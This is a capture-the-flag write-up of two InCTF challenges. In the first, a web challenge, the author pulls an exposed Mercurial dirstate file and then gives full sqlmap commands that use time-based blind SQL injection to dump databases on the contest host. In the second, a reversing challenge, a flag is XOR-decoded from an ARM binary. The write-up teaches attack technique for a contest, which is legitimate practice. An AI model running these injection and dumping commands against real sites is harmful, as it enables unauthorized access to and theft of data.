<b>Challenge:</b>
Liar

<b>Category</b>
Web

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/liarchallenge.png">

When the site loads, there is nothing on the page except for a message that nothing is on their website--but we know, as the title of the challenge states, this is a big, fat lie.

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/nothingonthesite.png">

The hint tells us that the site is using some form of VCS, and after some testing, I discovered the site was using Mercurial. Based on this knowledge, I used wget to download the ".hg/dirstate" file, which is a binary file that is an information directory about the repository. 

Running strings on the file, the following was output:

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/stringsondirstate.png">

Nice, so now we have a directory to look at, and it seems like there is also a vulnerable PHP to work with as well. The index.html has a form to "find your friends" and this is what is running the PHP. 

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/findyourfriends.png">

Inspecting the source code, we get a bit of a hint:

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/liar_sitehint.png">

So, I fired up Sqlmap to do the heavy lifting based on the data that was being passed, including name and the captcha:

sqlmap -u "http://liar.inctf.in/1ts_h4rd_t0_gu3ss/vulnerable.php" --data="name=ron&g-recaptcha-response=03AO6mBfw5nAnH7od5LVOqf7H-Yib-8E52lULt4-Zxt9dVb_j3NV6lLCf0BEAK5i3BnYLgoAradJJYGXSCPAe3OhOFJndC4eiJ2ndshWtp74YgsDO-qcfM2Iy4yvDuuCO4N_oIsZ-QtL9uqgqJseKy0ncgRT91QOL7QnKYun60O_2pSwJUN7tgXpxQjqaCzM-V064cRpAHePHKX8nUaAxvRanHQTfINRMFI9MSu1wlJnLO4GS-GD9reD2lZDqIRXJ8bGBRVBDmhtYJ2KUxPVYTMlKnS9BnrsT_eMvMIcef0ULl3-Zc4_qO81sCw0iEEEdjkNbL0PaQ72uUr8TZMH8MQR-xQ3xlNVs_VwZOGu79WeVEMtwLqfVFCONbaOJfpupzHEL17KMCemKxn3gLrNqhAe-7muUxB3EZ7iSQVQa16moJkxPOm8Hf7982" --dump-all --threads=10 --random-agent --dbms=mysql --level=5 --risk=3

The result: 

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/blindtimebased.png">

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/trolled.png">

Now when we go to dump all the databases, we get trolled. The CTF database had some leet speak in it that appeared to be the flag, but it was not. Since this is time-based, it will take a while to dump everything in information_schema (there are 61 tables), so I turned to check the mysql database first instead. Guessing a bit here, I first got the "innodb_table_stats" table and then decided to guess that a "phone" column existed in there since the hint in the source code mentioned our answer is in the phone column.

Luckily I was correct!

sqlmap -u "http://liar.inctf.in/1ts_h4rd_t0_gu3ss/vulnerable.php" --data="name=ron&g-recaptcha-response=03AO6mBfw5nAnH7od5LVOqf7H-Yib-8E52lULt4-Zxt9dVb_j3NV6lLCf0BEAK5i3BnYLgoAradJJYGXSCPAe3OhOFJndC4eiJ2ndshWtp74YgsDO-qcfM2Iy4yvDuuCO4N_oIsZ-QtL9uqgqJseKy0ncgRT91QOL7QnKYun60O_2pSwJUN7tgXpxQjqaCzM-V064cRpAHePHKX8nUaAxvRanHQTfINRMFI9MSu1wlJnLO4GS-GD9reD2lZDqIRXJ8bGBRVBDmhtYJ2KUxPVYTMlKnS9BnrsT_eMvMIcef0ULl3-Zc4_qO81sCw0iEEEdjkNbL0PaQ72uUr8TZMH8MQR-xQ3xlNVs_VwZOGu79WeVEMtwLqfVFCONbaOJfpupzHEL17KMCemKxn3gLrNqhAe-7muUxB3EZ7iSQVQa16moJkxPOm8Hf7982" --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D mysql -T innodb_table_stats -C phone --dump

Though the above took quite a bit to finish, it eventually dumps out our flag:

inctf{H0w_@b0Ut_@n_r3@L_1nJ3c}


=====================================================


<b>Challenge:</b>
Time

<b>Category</b>
Rev

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/Timechallenge.png">

Since this was an ARM file I couldn't find a way to run it on my machine, so I stuck to disassembling the binary file with Binary Ninja.

Looking at what was going on, I found a big segment of data that definitely looked like it could be important.

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/flaginhex.png">

Working backwards from here, it became clear that the function that spits out the flag, uses this data, and looking at the disassembly, you can see that the program is taking each one of these hex values and XORing it with 0x7.

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/xoring.png">

I created a Python script to do just that:

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/timepythonscript.png">

Running it we get the flag:

<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/timeflag.png">
